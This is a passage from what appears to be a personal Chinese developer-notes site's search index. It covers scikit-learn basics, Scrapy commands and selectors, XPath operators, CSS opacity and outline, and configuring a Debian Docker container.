Scitkit-learn官方文档提供了如下所示的图表，可以帮助我们确定哪种算法适合我们的任务。 Scikit learn之所以能如此直接地使用， 是因为无论我们使用的模型或算法是什么，用于模型训练和预测的代码结构都是相同的。 假设我们正在处理一个回归问题，希望训练一个线性回归算法，并使用得到的模型进行预测。 使用Scikit learn 的第一步是调用 logistic 回归估计器 并将其另存为对象。 下面的示例调用该算法并将其保存为一个名为 lr 的对象: from sklearn.linear_model import LogisticRegression lr = LogisticRegression(max_iter=10000) 使用lr算法拟合数据, 这里设置参数10000是因为 /docs/后端/python/python三方库/scikit-learn/问题/lbfgs failed to converge 然后使用fit来训练数据获取模型: from sklearn.model_selection import train_test_split x_train, x_test, y_train, y_test = train_test_split(x, y, random_state=0) x_train, x_test, y_train, y_test model = lr.fit(x_train, y_train) 用得到的模型, 实验 测试数据集 效果: # 接下来，我们使用模型和预测（） 方法对以前不可见的数据进行预测。 predictions = model.predict(x_test) predictions == y_test 输出: array([ True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, False, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True]) 如果我们现在要使用 Scitkit-learn 执行不同的任务， 比如训练一个随机森林分类器。代码看起来非常相似，并且具有相同的步骤数: from sklearn.ensemble import RandomForestClassifier rf = RandomForestClassifier() rf_model = rf.fit(X_train, y_train) rf_predictions = rf_model.predict(X_test) 这种一致的代码结构使得开发机器学习模型非常直接，并且还生成高度可读和可重复的代码。 预处理 在大多数实际机器学习项目中，我们使用的数据不一定准备好训练模型。 很可能首先需要执行一些数据预处理和转换步骤， 例如处理缺失值、将分类数据转换为数字或应用要素缩放。 Scikit-learn 具有执行这些预处理步骤的内置方法。 例如，SimpleImputer（） 会使用我们选择的方法来填充缺失的值: from sklearn.impute import SimpleImputer imputer = SimpleImputer(strategy='mean') X_train_clean = imputer.fit(X_train) 在 Scikit-learn 官方文档-预处理 中列出了数据预处理的完整选项 数据标准化和归一化 code: from sklearn.preprocessing import StandardScaler # 标准化 from sklearn.preprocessing import MinMaxScaler # 归一化 # 标准化 ss = StandardScaler() X_scaled = ss.fit_transform(X_train) # 传入待标准化的数据 # 归一化 mm = MinMaxScaler() X_scaled = mm.fit_transform(X_train) 模型评估 衡量模型在预测新数据方面的好坏程度 此步骤称为模型评估，我们选择的度量将由我们希望解决的任务来确定。 例如，通常在回归问题中，我们可以选择RMSE，而对于分类，则可以选择 F1 分数。 所有估算器都包含一个 score（）方法，该方法返回与它们执行的机器学习任务最相关的默认指标. 比如上面的model: model.score(x_test, y_test) # 输出 # 0.9777777777777777 Scikit-learn 还提供了一组指标函数，这些函数为模型提供了更详细的评估。 例如，对于分类任务，库具有分类报告，提供精度、召回、F1 评分和总体精度。 分类报告代码和输出如下所示: from sklearn.metrics import classification_report print(classification_report(rf_predictions, y_test)) 模型优化 Scikit-learn 库中的所有估算器都包含一系列参数，有多个选项， 为特定算法选择的值都将影响最终模型的性能。 例如，使用 RandomForestClass 表示器， 我们可以将树的 max_depth 设置为可能的任何值， 并且根据数据和任务的不同值，此参数的不同值将产生不同的结果。 这种尝试不同参数组合以找到最佳组合的过程称为超参数优化。 Scikit-learn 提供了两个自动执行此任务的工具， GridSearchCV 实现了一种称为详尽网格搜索的技术，以及执行随机参数优化的随机搜索 CV。 下面的示例使用 GridSearchCV 查找随机森林分类器的最佳参数，输出结果在代码下方: param_grid = { 'n_estimators': [200, 500], 'max_features': ['auto', 'sqrt', 'log2'], 'max_depth' : [4,5,6,7,8], 'criterion' :['gini', 'entropy'] } from sklearn.model_selection import GridSearchCV CV = GridSearchCV(rf, param_grid, n_jobs= 1) CV.fit(X_train, y_train) print(CV.best_params_) print(CV.best_score_) 管道 Scikit-learn 包以管道的形式提供了一种更加方便的代码封装形式。 此工具允许将所有预处理任务与分类器步骤连接在一起， 以便简单地在单个管道对象上调用 fit（） 或 predict（） 执行工作流中的所有步骤。 这样可以生成高可读代码，并减少机器学习工作流中步骤的重复。 为了创建管道，我们首先在下面的代码中定义我称之为管道的对象中的步骤。 然后，我们可以简单地调用此对象的拟合来训练模型。此外，管道对象还可用于对新数据进行预测: from sklearn.pipeline import Pipeline pipe = Pipeline([('imputer', SimpleImputer()), ('rf', RandomForestClassifier())]) pipeline_model = pipe.fit(X_train, y_train) pipeline_model.score(X_test, y_test)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-Simple-use-tutorial.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-Simple-use-tutorial.html"},{"title":"lbfgs failed to converge","text":"完整报错信息: /Users/yanque/Project/Code/Pycharm/StudyPytorch/.venv/lib/python3.10/site-packages/sklearn/linear_model/_logistic.py:469: ConvergenceWarning: lbfgs failed to converge (status=1): STOP: TOTAL NO. of ITERATIONS REACHED LIMIT. Increase the number of iterations (max_iter) or scale the data as shown in: https://scikit-learn.org/stable/modules/preprocessing.html Please also refer to the documentation for alternative solver options: https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression n_iter_i = _check_optimize_result( 这是说训练模型的时候，参数的迭代次数达到了限制（默认 max_iter=100）， 但是两次迭代参数变化还是比较大，仍然没有在一个很小的阈值以下，这就叫没有收敛。 不过，这只是一个警告（温馨提示）而已，我们可以选择 忽略. 如代码显示忽略: import warnings; warnings.filterwarnings(\"ignore\") 增大最大迭代次数, 如: LogisticRegression(max_iter=1000) 更换其他的模型或者那个参数 solver, 如: LogisticRegression(solver=\"sag\") 将数据进行预处理，提取更有用的特征","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-question-lbfgs-failed-to-converge.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-scikit-learn-question-lbfgs-failed-to-converge.html"},{"title":"ipconfig","text":"查看网络信息","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-ipconfig.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-ipconfig.html"},{"title":"genisoimage","text":"安装: apt install genisoimage 使用: geteltorito -o output_file.iso input_file.img","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GenisoImage.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GenisoImage.html"},{"title":"配置docker-debian","text":"拉取debian镜像: docker pull debian 运行: docker run --name mydebian -dit debian 进入: docker exec -it mydebian /bin/bash 安装验证工具(HTTPS): sudo apt install apt-transport-https ca-certificates 换源: mv /etc/apt/sources.list /etc/apt/sources.list.bak echo \"# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-updates main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-updates main contrib non-free deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-backports main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-backports main contrib non-free # deb https://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free # # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free deb https://security.debian.org/debian-security bullseye-security main contrib non-free # deb-src https://security.debian.org/debian-security bullseye-security main contrib non-free \" > /etc/apt/sources.list apt update 清华源地址debian配置帮助: debian 注解 如果报错 Certificate verification failed: The certificate is NOT trusted. 有两种解决方式 将 https 改成 http 先安装 apt-transport-https ca-certificates","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-debian-Configure-DEBIAN-container.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-Configure-DEBIAN-container.html"},{"title":"opacity","text":"设置元素透明度 opacity 属性控制元素的不透明度级别， 其值范围从 0 到 1， 0 表示完全透明（不可见）， 1 表示完全不透明（完全可见）。 将元素设置为半透明（透明度为 0.5）: .element { opacity: 0.5; } 注解 有时候不设置背景, 背景自动就是透明的","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-OPACITY.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-OPACITY.html"},{"title":"outline","text":"CSS 的 outline 属性用于设置元素的轮廓样式，它是一种在元素周围绘制轮廓线的装饰效果。 轮廓线位于元素的边框之外，并且不占据布局空间。 outline 属性可以接受多个值，包括： outline-width 用于设置轮廓线的宽度。可以使用具体的长度值（如像素或 em）或预定义的值（如 thin、medium、thick）。 outline-style 用于设置轮廓线的样式，可以是实线（solid）、虚线（dotted）、双实线（double）等。 outline-color 用于设置轮廓线的颜色，可以是具体的颜色值（如十六进制、RGB、颜色名称）。 选择所有的 <div> 元素，并为其设置了一个红色的 2 像素粗的实线轮廓: div { outline: 2px solid red; } 使用 outline 属性时，通常会同时设置 outline-width、outline-style 和 outline-color 的值，但也可以单独使用其中的某个属性。 需要注意的是，outline 属性是一个装饰性的效果，不同于 border 属性，它不占据布局空间。 此外，outline 属性在某些浏览器中可能会显示不同的效果或不支持某些属性值，因此在使用时需要进行兼容性测试。 注解 源于 AI 轮廓（outline）和边框（border）区别 位置 边框位于元素的内容区域和内边距之间，而轮廓则位于边框之外。换句话说，边框是围绕在元素的内容周围的线条，而轮廓是在边框外面绘制的线条。 占据空间 边框会占据元素的布局空间，也就是说，它会影响元素的尺寸和位置。而轮廓不会占据布局空间，它只是一种视觉效果，并不会改变元素的大小或布局。 样式和属性 边框具有更多的样式和属性选项，可以设置边框的宽度、样式和颜色，可以分别设置四个方向的边框。而轮廓的样式相对较少，通常只设置轮廓的宽度、样式和颜色。 兼容性 边框是 CSS 2.1 规范的一部分，得到了广泛的浏览器支持。而轮廓是 CSS2.1 规范中引入的，不同浏览器对于轮廓的样式和行为可能有所差异，因此在使用轮廓时需要进行兼容性测试。","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-outline.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-outline.html"},{"title":"XPath 运算符","text":"XPath 表达式可返回节点集、字符串、逻辑值以及数字。 XPath 运算符 下面列出了可用在 XPath 表达式中的运算符： 运算符 描述 实例 返回值 | 计算两个节点集 //book | //cd 返回所有拥有 book 和 cd 元素的节点集 + 加法 6 + 4 10 - 减法 6 - 4 2 * 乘法 6 * 4 24 div 除法 8 div 4 2 = 等于 price=9.80 如果 price 是 9.80，则返回 true。 如果 price 是 9.90，则返回 false。 != 不等于 price!=9.80 几乎同上 < 小于 price<9.80 几乎同上 <= 小于或等于 price<=9.80 几乎同上 > 大于 price>9.80 几乎同上 >= 大于或等于 price>=9.80 几乎同上 or 或 price=9.80 or price=9.70 几乎同上 and 与 price>9.00 and price<9.90 几乎同上 mod 计算除法的余数 5 mod 2 1 contains 包含, 主要用于属性 contains(@class, \"c2\") 以为例: <div class=\"c2 c3\">Direct Child Div 1</div> 表示匹配 class 包含 c2 count 子元素数量 count(a) a标签数量 contain的使用 如: *[contains(concat(' ', normalize-space(@class), ' '), ' someclass ')] 获取class 包含 someclass的元素 最繁琐 @class='someclass' 获取class 仅为 someclass的元素 可能会漏选 contains(@class, 'someclass') 获取class 包含 someclass的元素 但是可能会多选一些元素","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-Xpath-operator.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-XPath-Xpath-operator.html"},{"title":"Response","text":"位置: from scrapy.http import Response 对象方法 css(表达式): /docs/后端/python/python三方库/Scrapy/API/SelectorList 根据表达式获取对应的 CSS 元素, 可以理解为一个 CSS 选择器 返回 /docs/后端/python/python三方库/Scrapy/API/SelectorList 如获取 title 标签元素: # html <title>标题</title> # 元素 response.css(\"title\") # 文本 response.css(\"title::text\") 详见 /docs/后端/python/python三方库/Scrapy/API/SelectorList 选择器支持见 ../选择器/index xpath(表达式): /docs/后端/python/python三方库/Scrapy/API/SelectorList 使用 /docs/后端/python/教程/xpath/index 获取元素, 返回 /docs/后端/python/python三方库/Scrapy/API/SelectorList","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-Response.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-Response.html"},{"title":"SelectorList","text":"/docs/后端/python/python三方库/Scrapy/API/Selector 有的对象方法, 好像它也有. 对象方法 get(default=\"\"): str | None 获取第一个元素的data getall(): [str] 获取所有查询到的列表selector的data re(args) 对数据集的data, 进行正则查询 attrib[\"src\"] 不使用 /docs/后端/python/python三方库/Scrapy/选择器/index 获取属性 而是直接使用实例方法获取属性: response.css(\"img\").attrib[\"src\"] # 即 img::attr(src) # 或 //img/@src extract_first() 与 get 一致, 主要是为了兼容其他的(其他框架有这个), 下同 extract() 与 getall 一致","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-SelectOmerist.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-SelectOmerist.html"},{"title":"Selector","text":"参考: https://docs.scrapy.org/en/latest/topics/selectors.html#scrapy.selector.SelectorList code: class scrapy.selector.Selector(*args: Any, **kwargs: Any) 用于修饰 response 选择器选择的内容. response 是 HtmlResponse/XmlResponse 对象 支持参数: text HTML/XML 字符串 type 选择器类型, 支持 html 和 xml. 不给会自动选择最适合的 支持的: \"html\" for HtmlResponse type \"xml\" for XmlResponse type \"html\" for anything else 设置后就不会自动找 属性 selector 对象方法 css(表达式): /docs/后端/python/python三方库/Scrapy/API/SelectorList 根据表达式获取对应的 CSS 元素, 可以理解为一个 CSS 选择器 返回 /docs/后端/python/python三方库/Scrapy/API/SelectorList 如获取 title 标签元素: # html <title>标题</title> # 元素 response.css(\"title\") # 文本 response.css(\"title::text\") 选择器支持见 ../选择器/index 如果要获取属性, 比如 <a href=\"xxx\"/> 有两种方式: response.css(\"a\").attrib[\"href\"] response.css(\"a::attr('href')\") xpath(表达式): /docs/后端/python/python三方库/Scrapy/API/SelectorList 使用 /docs/后端/python/教程/xpath/index 获取元素, 返回 /docs/后端/python/python三方库/Scrapy/API/SelectorList 方法: xpath(query: str, namespaces: Optional[Mapping[str, str]] = None, **kwargs: Any)→ SelectorList[_SelectorType] 如: >>> t = response.xpath(\"//div[@class='tea_con']/div/ul/li\")[0] >>> t <Selector query=\"//div[@class='tea_con']/div/ul/li\" data='<li>\\n\\t\\t\\t\\t\\t<img src=\"images/teacher/ja...'> >>> >>> t.xpath(\"div/h4\") [<Selector query='div/h4' data='<h4>高级讲师</h4>'>] >>> 注意, 新的 xpath 表达式, 如果不带斜杠, 表示是从上一级继续找, 比如例子 t.xpath(\"div/h4\") 就是从上面的 query 继续找: //div[@class='tea_con']/div/ul/li/div/h4 但是如果有斜杠, 上一层的query就没了(因为会视作绝对路径). 如果非要用鞋杠, 需要加点: .//div/h4 表示找相对路径 包含使用 contains: contains(@class, \"c1\") 可参考 /docs/后端/python/教程/xpath/XPath运算符","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-Selector.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-API-Selector.html"},{"title":"genspider","text":"不依赖项目目录 生成一个爬虫文件. 如果当前位置是非项目目录, 生成到当前目录下. 如果当前位置是项目目录, 生成到 spiders 目录. 语法: scrapy genspider [-t template] <name> <domain or URL> name 设置爬虫的 name 属性, 文件名也是这 domain or URL 可选. 如果指定了, 会在爬虫类生成 allowed_domains 和 start_urls 属性 -t template 指定生成时使用的模版. 如: $ scrapy genspider -l Available templates: basic crawl csvfeed xmlfeed $ scrapy genspider example example.com Created spider 'example' using template 'basic' $ scrapy genspider -t crawl scrapyorg scrapy.org Created spider 'scrapyorg' using template 'crawl' 比如创建一个 名为 mydomain 的爬虫, 爬取 mydomain 地址: scrapy genspider mydomain mydomain.com","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Genspider.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Genspider.html"},{"title":"parse","text":"依赖项目目录 语法: scrapy parse <url> [options] 获取指定的 URL 数据, 并使用 parse 函数进行转换. 支持选项 --spider= SPIDER 指定爬虫, 会自动检测url --a args 设定执行的参数 格式: --a [NAME=VALUE] --callback , -c 回调方法, 默认使用 parse 函数 --meta , -m 额外提供给 回调方法 的参数. 必须是json格式 Example: –meta='{\"foo\" : \"bar\"}' --cbkwargs 额外提供给 回调函数 的 关键字参数 Example: –cbkwargs='{\"foo\" : \"bar\"}' --pipelines process items through pipelines --rules , -r 使用 CrawlSpider 规则发现 回调函数. 没大懂, 原文: use CrawlSpider rules to discover the callback (i.e. spider method) to use for parsing the response --noitems don't show scraped items --nolinks don't show extracted links --nocolour 避免存在颜色输出. avoid using pygments to colorize the output --depth , -d 请求最多被递归调用多少次. 默认1. depth level for which the requests should be followed recursively (default: 1) --verbose , -v 输出每一个调用详情. display information for each depth level --output , -o 将结果输出到文件. dump scraped items to a file New in version 2.3. Usage example: $ scrapy parse http://www.example.com/ -c parse_item [ ... scrapy log lines crawling example.com spider ... ] >>> STATUS DEPTH LEVEL 1 <<< # Scraped Items ------------------------------------------------------------ [{'name': 'Example item', 'category': 'Furniture', 'length': '12 cm'}] # Requests ----------------------------------------------------------------- []","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Parse.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Parse.html"},{"title":"settings","text":"不依赖项目目录 语法: scrapy settings [options] 获取配置信息 如果在项目下, 输出项目的配置 不在项目输出默认配置 Example usage: $ scrapy settings --get BOT_NAME scrapybot $ scrapy settings --get DOWNLOAD_DELAY 0","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Settings.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-Settings.html"},{"title":"view","text":"不依赖项目目录 用浏览器打开指定的 url 语法: scrapy view <url> 选项 --spider= SPIDER 自动探测指定爬虫的url --no-redirect 不重定向 Usage example: $ scrapy view http://www.example.com/some/page.html [ ... browser starts ... ]","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-VIEW.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-VIEW.html"},{"title":"bench","text":"不依赖项目目录 语法: scrapy bench Run a quick benchmark test. Benchmarking. 翻译: 运行一个快速基准测试。标杆","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-bench.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-bench.html"},{"title":"check","text":"依赖项目目录 语法: scrapy check [-l] <spider> 运行检查: $ scrapy check -l first_spider * parse * parse_item second_spider * parse * parse_item $ scrapy check [FAILED] first_spider:parse_item >>> 'RetailPricex' field is missing [FAILED] first_spider:parse >>> Returned 92 requests, expected 0..4","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-check.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-check.html"},{"title":"crawl","text":"依赖项目目录 运行指定的爬虫: scrapy crawl [options] $spiderName 支持option --overwrite-output FILE , -O FILE 将输出写入到文件(如果文件已存在则覆盖) dump scraped items into FILE, overwriting any existing file, to define format set a colon at the end of the output URI (i.e. -O FILE:FORMAT ) --output FILE , -o FILE 将 输出 增加到file (不会覆盖已存在的内容) 但是新增模式不支持json(能写, 但是文件格式存在问题), 可以使用 jsonl jsonl JSON Lines 格式流式的, 支持新增内容更简单(没懂意思), 原文: The JSON Lines format is useful because it's stream-like, you can easily append new records to it. It doesn't have the same problem of JSON when you run twice. 每一个记录是一个单独的行, 所以如果文件很大的时候, 可以直接逐行读取分析. 原文: Also, as each record is a separate line, you can process big files without having to fit everything in memory, there are tools like JQ to help do that at the command-line. jsonl 参考 https://jsonlines.org -a args 自定义爬虫参数, 提供自定义参数列表给爬虫. 格式: -a NAME=VALUE 如: scrapy crawl quotes -O quotes-humor.json -a tag=humor 代码: import scrapy class QuotesSpider(scrapy.Spider): name = \"quotes\" def start_requests(self): url = \"https://quotes.toscrape.com/\" tag = getattr(self, \"tag\", None) if tag is not None: url = url + \"tag/\" + tag yield scrapy.Request(url, self.parse) def parse(self, response): for quote in response.css(\"div.quote\"): yield { \"text\": quote.css(\"span.text::text\").get(), \"author\": quote.css(\"small.author::text\").get(), } next_page = response.css(\"li.next a::attr(href)\").get() if next_page is not None: yield response.follow(next_page, self.parse) 实际寻找的url就是: https://quotes.toscrape.com/tag/humor --output-format FORMAT , -t FORMAT 已经废弃 , 定义当数据输出时的格式, 不能于 -O 一起用 -h , --help 帮助消息 spiderName 为定义在 spiders 目录下的具体的爬虫name () 如: scrapy crawl itcast -O t.json 如: $ scrapy crawl myspider [ ... myspider starts crawling ... ] $ scrapy crawl -o myfile:csv myspider [ ... myspider starts crawling and appends the result to the file myfile in csv format ... ] $ scrapy crawl -O myfile:json myspider [ ... myspider starts crawling and saves the result in myfile in json format overwriting the original content... ] $ scrapy crawl -o myfile -t csv myspider [ ... myspider starts crawling and appends the result to the file myfile in csv format ... ]","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-crawl.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-crawl.html"},{"title":"edit","text":"依赖项目目录 语法: scrapy edit <spider> 使用 EDITOR 环境变量指定的编辑器(没有就用配置的 EDITOR), 来编辑指定的爬虫 仅是一个便捷的修改方式","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-edit.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-edit.html"},{"title":"fetch","text":"不依赖项目目录 语法: scrapy fetch <url> 使用 Scrapy downloader 下载给定的URL, 下载结果在标准输出 如果在项目内, 与爬虫获取到的页面是一致的(会使用配置的属性如 USER-AGENT) 如果在其他目录, 使用默认的配置属性 支持选项 --spider= SPIDER 指定执行的爬虫, 没有就自动探测 --headers 打印 HTTP 响应的消息头, 而不是打印 body --no-redirect 如果获取消息时, 遇到 3xx 的重定向, 就放弃(默认会跟着重定向到新地址) Usage examples: $ scrapy fetch --nolog http://www.example.com/some/page.html [ ... html content here ... ] $ scrapy fetch --nolog --headers http://www.example.com/ {'Accept-Ranges': ['bytes'], 'Age': ['1263 '], 'Connection': ['close '], 'Content-Length': ['596'], 'Content-Type': ['text/html; charset=UTF-8'], 'Date': ['Wed, 18 Aug 2010 23:59:46 GMT'], 'Etag': ['\"573c1-254-48c9c87349680\"'], 'Last-Modified': ['Fri, 30 Jul 2010 15:30:18 GMT'], 'Server': ['Apache/2.2.3 (CentOS)']}","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-fetch.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-fetch.html"},{"title":"list","text":"依赖项目目录 列出所有的爬虫, 以行为分隔符. 语法: scrapy list 用例: $ scrapy list spider1 spider2","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-list.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-list.html"},{"title":"runspider","text":"不依赖项目目录 语法: scrapy runspider <spider_file.py> 将目录下的单个Python文件视作爬虫, 运行 Example usage: $ scrapy runspider myspider.py [ ... spider starts crawling ... ]","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-runspider.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-runspider.html"},{"title":"shell","text":"不依赖项目目录 启动一个交互式的爬虫终端, 如果有ipython就会用ipython: scrapy shell $url 启动成功后, 在当前环境会有一个 response 变量, 代表爬虫的响应, 与爬虫类 parse 方法的第一个 response 参数一致. 支持选项 --spider= SPIDER 使用指定爬虫的url -c code 执行指定的代码并输出 --no-redirect 不重定向 Usage example: $ scrapy shell http://www.example.com/some/page.html [ ... scrapy shell starts ... ] $ scrapy shell --nolog http://www.example.com/ -c '(response.status, response.url)' (200, 'http://www.example.com/') # shell follows HTTP redirects by default $ scrapy shell --nolog http://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F -c '(response.status, response.url)' (200, 'http://example.com/') # you can disable this with --no-redirect # (only for the URL passed as command line argument) $ scrapy shell --no-redirect --nolog http://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F -c '(response.status, response.url)' (302, 'http://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F')","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-shell.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-shell.html"},{"title":"version","text":"不依赖项目目录 语法: scrapy version [-v] 打印 Scrapy 版本信息. -v 还会额外输出 Python, Twisted and Platform 信息","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-version.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Command-line-tool-version.html"},{"title":"CSS选择器","text":"主要是用法. 概述: ::text 获取文本 ::attr(属性名) 获取指定属性 *::text * 表示所有, 即获取所有文本 比如有: 如有以下HTML:: <!DOCTYPE html> <html> <head> <base href='http://example.com/' /> <title>Example website</title> </head> <body> <div id='images'> <a href='image1.html'>Name: My image 1 <br /><img src='image1_thumb.jpg' alt='image1'/></a> <a href='image2.html'>Name: My image 2 <br /><img src='image2_thumb.jpg' alt='image2'/></a> <a href='image3.html'>Name: My image 3 <br /><img src='image3_thumb.jpg' alt='image3'/></a> <a href='image4.html'>Name: My image 4 <br /><img src='image4_thumb.jpg' alt='image4'/></a> <a href='image5.html'>Name: My image 5 <br /><img src='image5_thumb.jpg' alt='image5'/></a> </div> </body> </html> 选择title的内容: title::text 获取 href: html head base::attr(className) 获取所有 image 下的文本: #images *::text 在代码中就是: >>> response.css(\"#images *::text\").getall() ['\\n ', 'Name: My image 1 ', '\\n ', 'Name: My image 2 ', '\\n ', 'Name: My image 3 ', '\\n ', 'Name: My image 4 ', '\\n ', 'Name: My image 5 ', '\\n ']","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Selector-CSS-selector.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Scrapy-Selector-CSS-selector.html"},{"title":"XPath选择器","text":"XPath 参考 /docs/后端/python/教程/xpath/index 概述: text() 获取文本 @属性名 获取指定属性, 不跟表达式仅表示存在当前属性 has-class 是否包含指定class has-class(\"cl1\") 是否包含 class属性 cl1 (仅Scrapy支持) 如有以下HTML: <!DOCTYPE html> <html> <head> <base href='http://example.com/' /> <title>Example website</title> </head> <body> <div id='images'> <a href='image1.html'>Name: My image 1 <br /><img src='image1_thumb.jpg' alt='image1'/></a> <a href='image2.html'>Name: My image 2 <br /><img src='image2_thumb.jpg' alt='image2'/></a> <a href='image3.html'>Name: My image 3 <br /><img src='image3_thumb.jpg' alt='image3'/></a> <a href='image4.html'>Name: My image 4 <br /><img src='image4_thumb.jpg' alt='image4'/></a> <a href='image5.html'>Name: My image 5 <br /><img src='image5_thumb.jpg' alt='image5'/></a> </div> <div class='cl1 cl2'> Name: My image 5 <br /> <img src='image5_thumb.jpg' alt='image5'/> </div> </body> </html> 选择title的内容: //title/text() 获取所有 a 标签的内容: //div[@id=\"images\"]/a/text() 包含使用 contains contains(@id, \"images\") 比如有多个class属性的时候, =是不成立的, 只好用 contains, 参考 XpathContain : //div[contains(@class, \"cl1\")]/img/@src 可以发现使用 contains 是比较麻烦的, 且不易兼容所有情况, 所以有时还是使用 /docs/后端/python/python三方库/Scrapy/选择器/CSS选择器 更简单: .css(\"div.cl1\").xpath(\"./img/@src\") 可参考 /docs/后端/python/教程/xpath/XPath运算符 加不加括号的区别 举例: <ul class=\"list\"> <li>1</li> <li>2</li> <li>3</li> </ul> <ul class=\"list\"> <li>4</li> <li>5</li> <li>6</li> </ul> 不加括号(选择所有组节点): //li[1] //ul/li[1] # 结果都是 ['<li>1</li>', '<li>4</li>'] 加括号(将所有组合并一个组): (//li)[1] (//ul/li)[1] # 结果都是 ['<li>1</li>'] 条件表达式下使用text 应该避免直接使用: .//text() 而是使用: . 因为前者在Scrapy框架会返回一个包含所有text文本的生成器结果集(yield []), 然后当其作为参数传递给 str的函数比如 contains(), starts-with(), 只会返回第一个结果 比如: >>> from scrapy import Selector >>> sel = Selector( ... text='<a href=\"#\">Click here to go to the <strong>Next Page</strong></a>' ... ) 转换为 String 的结果集: >>> sel.xpath(\"//a//text()\").getall() # take a peek at the node-set ['Click here to go to the ', 'Next Page'] >>> sel.xpath(\"string(//a[1]//text())\").getall() # convert it to string ['Click here to go to the '] 转换为字符串的节点会丢失后代节点: >>> sel.xpath(\"//a[1]\").getall() # select the first node ['<a href=\"#\">Click here to go to the <strong>Next Page</strong></a>'] >>> sel.xpath(\"string(//a[1])\").getall() # convert it to string, 丢失了后代 ['Click here to go to the Next Page'] 这时使用 .//text() 得不到任何结果: >>> sel.xpath(\"//a[contains(.//text(), 'Next Page')]\").getall() [] 但如果使用 . , 就可获取到: >>> sel.xpath(\"//a[contains(., 'Next Page')]\").getall() ['<a href=\"#\">Click here to go to the 